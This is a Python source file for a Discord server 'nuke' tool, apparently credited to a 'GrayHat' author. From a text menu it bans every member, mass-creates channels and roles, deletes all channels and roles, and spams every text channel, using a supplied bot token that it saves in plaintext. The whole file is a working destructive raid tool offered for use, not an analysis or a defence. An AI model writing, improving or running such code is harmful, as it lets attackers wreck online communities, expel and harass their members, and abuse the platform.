import discord
import asyncio
import os
from colorama import init, Fore, Style

init(autoreset=True)

CONFIG_FILE = "config.txt"

def save_config(token, server_id):
    with open(CONFIG_FILE, "w") as f:
        f.write(f"{token.strip()}\n{server_id.strip()}")

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            lines = f.read().splitlines()
            if len(lines) >= 2:
                return lines[0], lines[1]
    return None, None

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_centered(text):
    lines = text.split('\n')
    width = max(len(line) for line in lines)
    terminal_width = os.get_terminal_size().columns
    for line in lines:
        print(' ' * ((terminal_width - width) // 2) + line)

gold = Fore.YELLOW + Style.BRIGHT

menu = f"""
╔{'═'*47}╗
║ {gold}[1] BAN ALL           [2] CREATE CHANNELS      ║
║ {gold}[3] DELETE CHANNELS   [4] CREATE ROLES         ║
║ {gold}[5] DELETE ROLES      [6] SPAM                 ║
╚{'═'*47}╝
"""


token, server_id = load_config()
if not token or not server_id:
    token = input(gold + "Enter token BOT: ")
    server_id = input(gold + "Enter SERVER ID: ")
    save_config(token, server_id)
else:
    clear()
    print_centered(gold + "Loaded saved token and server ID.\n")


intents = discord.Intents.default()
intents.members = True

class LoginClient(discord.Client):
    async def on_ready(self):
        clear()
        print_centered(gold + "sucss logged in\n")
        print_centered(menu)
        self.logged_in = True
        await self.close()

client = LoginClient(intents=intents)
client.logged_in = False

try:
    client.run(token)
except Exception as e:
    print_centered(Fore.RED + f"Login failed: {e}")
    exit()

if not getattr(client, "logged_in", False):
    print_centered(Fore.RED + "Login failed!")
    exit()

while True:
    clear()
    logo = [
        "..######...########.....###....##....##.##.....##....###....########",
        ".##....##..##.....##...##.##....##..##..##.....##...##.##......##...",
        ".##........##.....##..##...##....####...##.....##..##...##.....##...",
        ".##...####.########..##.....##....##....#########.##.....##....##...",
        ".##....##..##...##...#########....##....##.....##.#########....##...",
        ".##....##..##....##..##.....##....##....##.....##.##.....##....##...",
        "..######...##.....##.##.....##....##....##.....##.##.....##....##..."
    ]
    for line in logo:
        print_centered(gold + line)
    print_centered(gold + "Author : M5TL , GRAYHAT")
    print_centered(gold + "Discord : GrayHat#1234\n")
    print_centered(menu)

    choice = input(gold + " " * ((os.get_terminal_size().columns // 2) - 5) + ">> ")

    if choice == "1":
        
        intents = discord.Intents.default()
        intents.members = True

        class MyClient(discord.Client):
            async def on_ready(self):
                print(f"Logged in as {self.user}")
                guild = self.get_guild(int(server_id))
                if not guild:
                    print("Guild not found!")
                    await self.close()
                    return
                print(f"Banning all members in: {guild.name}")
                for member in guild.members:
                    if member == self.user:
                        continue
                    try:
                        await guild.ban(member, reason="Nuke by GrayHat")
                        print(f"Banned {member}")
                    except Exception as e:
                        print(f"Failed to ban {member}: {e}")
                await self.close()

        client = MyClient(intents=intents)
        try:
            client.run(token)
        except Exception as e:
            print(f"Login failed: {e}")
        input(gold + "\nDone! Press Enter to return to menu...")
        continue
    elif choice == "2":
        channel_name = input(gold + "Enter channel name: ")
        channel_count = int(input(gold + "How many channels to create?: "))

        intents = discord.Intents.default()
        intents.guilds = True

        class CreateChannelsClient(discord.Client):
            async def on_ready(self):
                guild = self.get_guild(int(server_id))
                if not guild:
                    print_centered(Fore.RED + "Guild not found!")
                    await self.close()
                    return
                print_centered(gold + f"Creating {channel_count} channels named '{channel_name}'...")

                async def create_channel(i):
                    try:
                        await guild.create_text_channel(f"{channel_name}-{i+1}")
                        print_centered(gold + f"Created channel: {channel_name}-{i+1}")
                    except Exception as e:
                        print_centered(Fore.RED + f"Failed to create channel: {e}")

                await asyncio.gather(*(create_channel(i) for i in range(channel_count)))
                await self.close()

        client = CreateChannelsClient(intents=intents)
        try:
            client.run(token)
        except Exception as e:
            print_centered(Fore.RED + f"Login failed: {e}")
        input(gold + "\nDone! Press Enter to return to menu...")
        continue
    elif choice == "3":
        intents = discord.Intents.default()
        intents.guilds = True

        class DeleteChannelsClient(discord.Client):
            async def on_ready(self):
                guild = self.get_guild(int(server_id))
                if not guild:
                    print_centered(Fore.RED + "Guild not found!")
                    await self.close()
                    return
                print_centered(gold + f"Deleting all channels in: {guild.name}...")

                async def delete_channel(channel):
                    try:
                        await channel.delete()
                        print_centered(gold + f"Deleted channel: {channel.name}")
                    except Exception as e:
                        print_centered(Fore.RED + f"Failed to delete channel: {e}")

                await asyncio.gather(*(delete_channel(channel) for channel in list(guild.channels)))
                await self.close()

        client = DeleteChannelsClient(intents=intents)
        try:
            client.run(token)
        except Exception as e:
            print_centered(Fore.RED + f"Login failed: {e}")
        input(gold + "\nDone! Press Enter to return to menu...")
        continue
    elif choice == "4":
        role_name = input(gold + "Enter role name: ")
        role_count = int(input(gold + "How many roles to create?: "))

        intents = discord.Intents.default()
        intents.guilds = True

        class CreateRolesClient(discord.Client):
            async def on_ready(self):
                guild = self.get_guild(int(server_id))
                if not guild:
                    print_centered(Fore.RED + "Guild not found!")
                    await self.close()
                    return
                print_centered(gold + f"Creating {role_count} roles named '{role_name}'...")

                async def create_role(i):
                    try:
                        await guild.create_role(name=f"{role_name}-{i+1}")
                        print_centered(gold + f"Created role: {role_name}-{i+1}")
                    except Exception as e:
                        print_centered(Fore.RED + f"Failed to create role: {e}")

                await asyncio.gather(*(create_role(i) for i in range(role_count)))
                await self.close()

        client = CreateRolesClient(intents=intents)
        try:
            client.run(token)
        except Exception as e:
            print_centered(Fore.RED + f"Login failed: {e}")
        input(gold + "\nDone! Press Enter to return to menu...")
        continue
    elif choice == "5":
        intents = discord.Intents.default()
        intents.guilds = True

        class DeleteRolesClient(discord.Client):
            async def on_ready(self):
                guild = self.get_guild(int(server_id))
                if not guild:
                    print_centered(Fore.RED + "Guild not found!")
                    await self.close()
                    return
                print_centered(gold + f"Deleting all roles in: {guild.name}...")

                async def delete_role(role):
                    try:
     
                        if not role.managed and role != guild.default_role:
                            await role.delete()
                            print_centered(gold + f"Deleted role: {role.name}")
                    except Exception as e:
                        print_centered(Fore.RED + f"Failed to delete role: {e}")

                await asyncio.gather(*(delete_role(role) for role in list(guild.roles)))
                await self.close()

        client = DeleteRolesClient(intents=intents)
        try:
            client.run(token)
        except Exception as e:
            print_centered(Fore.RED + f"Login failed: {e}")
        input(gold + "\nDone! Press Enter to return to menu...")
        continue
    elif choice == "6":
        spam_message = input(gold + "Enter spam message: ")

        intents = discord.Intents.default()
        intents.guilds = True
        intents.messages = True

        class SpamClient(discord.Client):
            async def on_ready(self):
                guild = self.get_guild(int(server_id))
                if not guild:
                    print_centered(Fore.RED + "Guild not found!")
                    await self.close()
                    return
                print_centered(gold + f"Spamming all channels in: {guild.name}...")

                async def spam_channel(channel):
                    try:
                        if isinstance(channel, discord.TextChannel):
                            await channel.send(spam_message)
                            print_centered(gold + f"Sent spam in: {channel.name}")
                    except Exception as e:
                        print_centered(Fore.RED + f"Failed to spam {channel.name}: {e}")

                await asyncio.gather(*(spam_channel(channel) for channel in guild.text_channels))
                await self.close()

        client = SpamClient(intents=intents)
        try:
            client.run(token)
        except Exception as e:
            print_centered(Fore.RED + f"Login failed: {e}")
        input(gold + "\nDone! Press Enter to return to menu...")
        continue
    elif choice.lower() in ["exit", "q", "quit"]:
        break
    else:
        print_centered(Fore.RED + "Invalid choice!")
        input("Press Enter to return to menu...")
        continue